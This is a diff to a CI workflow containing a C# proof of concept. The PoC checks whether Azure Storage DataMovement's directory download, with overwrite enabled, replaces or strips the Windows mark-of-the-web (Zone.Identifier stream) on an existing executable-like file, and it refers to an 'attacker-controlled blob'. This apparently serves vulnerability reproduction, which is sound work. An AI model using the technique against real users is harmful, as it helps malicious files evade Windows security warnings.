@@ -16,6 +16,7 @@ jobs:
           Set-Content -Path poc/Program.cs -Value @'
           using Azure;
           using Azure.Storage.Blobs;
+          using Azure.Storage.DataMovement;
           using Azure.Storage.DataMovement.Blobs;
 
           var connStr = Environment.GetEnvironmentVariable("AZURE_STORAGE_CONNECTION_STRING");
@@ -27,23 +28,20 @@ jobs:
           File.WriteAllBytes(preExisting, new byte[]{0x4D,0x5A});
           File.WriteAllText(preExisting + ":Zone.Identifier", "[ZoneTransfer]\r\nZoneId=3\r\n");
 
-          Console.WriteLine("--- BEFORE download (simulated: file already downloaded from internet) ---");
+          Console.WriteLine("--- BEFORE ---");
           Console.WriteLine(File.ReadAllText(preExisting + ":Zone.Identifier"));
 
-          var transfer = await container.DownloadToDirectoryAsync(WaitUntil.Completed, dest);
-          Console.WriteLine($"TRANSFER_STATUS={transfer.Status}");
-
-          Console.WriteLine("--- AFTER download (via attacker-controlled blob) ---");
-          try
+          var options = new BlobContainerClientTransferOptions
           {
-              Console.WriteLine(File.ReadAllText(preExisting + ":Zone.Identifier"));
-          }
-          catch (Exception ex)
-          {
-              Console.WriteLine($"ERROR: {ex.Message}");
-          }
+              TransferOptions = new TransferOptions { CreationMode = StorageResourceCreationMode.OverwriteIfExists }
+          };
+          var transfer = await container.DownloadToDirectoryAsync(WaitUntil.Completed, dest, options);
+          Console.WriteLine($"TRANSFER_STATE={transfer.Status.State}");
+          Console.WriteLine($"HAS_FAILED_ITEMS={transfer.Status.HasFailedItems}");
 
-          Console.WriteLine($"DEST_DIR={dest}");
+          Console.WriteLine("--- AFTER ---");
+          try { Console.WriteLine(File.ReadAllText(preExisting + ":Zone.Identifier")); }
+          catch (Exception ex) { Console.WriteLine($"ERROR: {ex.Message}"); }
           '@
       - name: Run download
         shell: pwsh
